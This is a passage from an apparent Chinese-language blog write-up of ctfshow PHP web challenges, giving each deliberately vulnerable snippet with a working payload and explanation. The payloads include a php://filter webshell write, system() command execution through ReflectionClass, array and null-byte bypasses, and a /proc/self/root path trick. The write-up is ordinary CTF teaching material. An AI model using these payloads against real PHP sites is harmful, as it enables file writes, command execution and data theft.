class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin</code></p><ul><li>is_numeric()：检测变量是否为数字或数字字符串（可以利用科学计数法绕过）</li><li>call_user_func()：把第一个参数作为回调函数调用（其余参数为回调函数的参数）</li><li><p>解题思路：</p><ul><li>v4需为真，则v2需为数字或者为科学计数法形式的数字字符串</li><li>根据第六行得出，对v2需要进行特殊处理——从第二个字符开始算起</li><li>对经过处理的v2进行某种函数操作，v1需为函数名</li><li>将处理后的数据写入文件中，v3需为文件名</li></ul></li><li><p>call_user_func()函数可与hex2bin()函数搭配使用（hex2bin()：将十六进制文本转换为ASCII码字符）</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * v2为写入文件的内容要求：该数据的base64编码后的数据的十六进制是纯数字或者科学计数法形式</span></span><br><span class="line"><span class="comment"> * 例：&lt;?=`cat *`;</span></span><br><span class="line"><span class="comment"> * base64编码为：PD89YGNhdCAqYDs</span></span><br><span class="line"><span class="comment"> * 十六进制转换为：5044383959474e6864434171594473</span></span><br><span class="line"><span class="comment"> * 因为substr使得数据从第二位开始截取，所以需在前面加两位数字</span></span><br><span class="line"><span class="comment"> * v2=115044383959474e6864434171594473</span></span><br><span class="line"><span class="comment"> * 因为要对v2进行十六进制转换base64，所以v1为hex2bin函数</span></span><br><span class="line"><span class="comment"> * 数据最后后为base64编码形式</span></span><br><span class="line"><span class="comment"> * 所以需利用伪协议写入文件，条件是base64编码</span></span><br><span class="line"><span class="comment"> * v3=php://filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h1 id="web103-call-user-func"><a href="#web103-call-user-func" class="headerlink" title="web103(call_user_func)"></a>web103(call_user_func)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin</code></p><ul><li>if表达式中不能出现php，但是我们经过处理的数据也不存在php</li><li>所payload跟上道题一样</li></ul><h1 id="web104-sha1"><a href="#web104-sha1" class="headerlink" title="web104(sha1)"></a>web104(sha1)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v2[]=1    v1[]=1</code></p><ul><li>数组绕过</li></ul><h1 id="web105-foreach"><a href="#web105-foreach" class="headerlink" title="web105(foreach)"></a>web105(foreach)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p><code>payload: ?fff=flag error=fff</code></p><ul><li><p>遍历数组，使用foreach，必须使用数组</p></li><li><p>代码分析：</p></li></ul><blockquote><p>看源码，能输出数据的只有<code>$flag $error $suces</code>三个变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一个foreach将我们传入的<code>变量=值</code>以键值对的形式进行赋值<br><code>$key=变量 $value=值</code><br>经过第五行的变量覆盖处理得到覆盖后的数据<br><code>$$key=$变量 $$value=$值</code><br>并且$key不等于error</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第二个foreach将我们传入的<code>变量=值</code>以键值对的形式进行赋值<br><code>$key=变量 $value=值</code><br>经过第五行的变量覆盖处理得到覆盖后的数据<br><code>$$key=$变量 $$value=$值</code><br>并且$value不等于flag</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第三段if判断<br>POST传入的值不为变量flag，则输出变量error</p></blockquote><ul><li>解题思路：<ul><li>可以利用error进行输出，只需要POST传入的值不为flag变量即可</li><li>GET传参：?fff=flag  <ul><li>$key=$fff  $value=$flag =&gt; $fff=$flag</li></ul></li><li>POST传参：?error=fff<ul><li>$key=$error $value=$fff =&gt; $error=$fff</li></ul></li><li>将$flag的值赋值给$error，输出$error即可</li><li>满足if判断，即可输出flag</li></ul></li></ul><h1 id="web106-sha1"><a href="#web106-sha1" class="headerlink" title="web106(sha1)"></a>web106(sha1)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v2[]=1 v1[]=2</code></p><ul><li>数组绕过，只需要让值不同即可</li></ul><h1 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v3[]=1 v1=&#39;flag=0&#39;</code></p><ul><li>parse_str()：将第一个参数作为数组元素存入第二个变量中</li><li>存数组的变量为$v2，且if中判断索引值为flag的值是否和v3经过md5加密的数据相等</li><li>所以POST传入<code>&#39;flag=0&#39;</code>（注意：POST传参需要用单引号）</li><li>GET可以传入数组进行绕过</li></ul><h1 id="web108-strrev"><a href="#web108-strrev" class="headerlink" title="web108(strrev)"></a>web108(strrev)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>paylad: ?c=a%00778</code></p><ul><li>strrev()：字符串反转，但%00不会反转（%00是一个整体，不会反转成00% ）</li><li>第一个if需要GET传入的参数有字母才能绕过</li><li>第二个if将传入的数据反转后为0x36d（877）才能输出flag</li><li>可以利用00截断，在第一个if判断时截断，使得检测出的数据只有字母，在第二个if判断时，检测反转后的数据，将字母截断，使数据只有数字877</li></ul><h1 id="web109-ReflectionClass-system"><a href="#web109-ReflectionClass-system" class="headerlink" title="web109(ReflectionClass(system()))"></a>web109(ReflectionClass(system()))</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=ReflectionClass&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code></p><ul><li>从if判断中得出传入的参数需为字母</li><li>经过代码执行，输出一个数据</li><li>因为new可以得出，大概率是输出一个类</li><li>所以可以利用反射类<code>ReflectionClass(system())</code>加命令来操作</li></ul><h1 id="web110-FilesystemIterator-getcwd"><a href="#web110-FilesystemIterator-getcwd" class="headerlink" title="web110(FilesystemIterator(getcwd()))"></a>web110(FilesystemIterator(getcwd()))</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=FilesystemIterator&amp;v2=getcwd 访问文件</code></p><ul><li>过滤了一大堆东西，上道题的payload不能用了</li><li>利用内置类读文件</li><li><code>FilesystemIterator(getcwd())</code>返回、<ul><li>FilesystemIterator获取指定目录下的所有文件</li><li>getcwd()函数：获取当前工作目录 返回当前工作目录</li></ul></li><li>得到文件名字后，直接访问该文件</li></ul><h1 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111($GLOBALS)"></a>web111($GLOBALS)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=ctfshow&amp;v2=GLOBALS</code></p><ul><li>根据代码发现唯一可能得到flag的地方在getflag这个方法里</li><li>两个if对传入的数据分别过滤了一大堆东西</li><li>第三个if发现v1的值需为ctfshow才能执行这个getflag方法</li><li>在getflag方法里<ul><li>eval将两个变量进行了引用，所以第二个参数我们传全局变量</li><li>通过变量覆盖，使输出的数据为$GLOBALS</li></ul></li></ul><h1 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><ul><li>is_file()：判断给定文件名是否为一个正常的文件，参数为文件路径</li><li><p>在linux中/proc/self/root是指向根目录的</p></li><li><p>多次上面的操作可以绕过is_file</p></li></ul><h1 id="web113-is-file"><a href="#web113-is-file" class="headerlink" title="web113(is_file)"></a>web113(is_file)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight 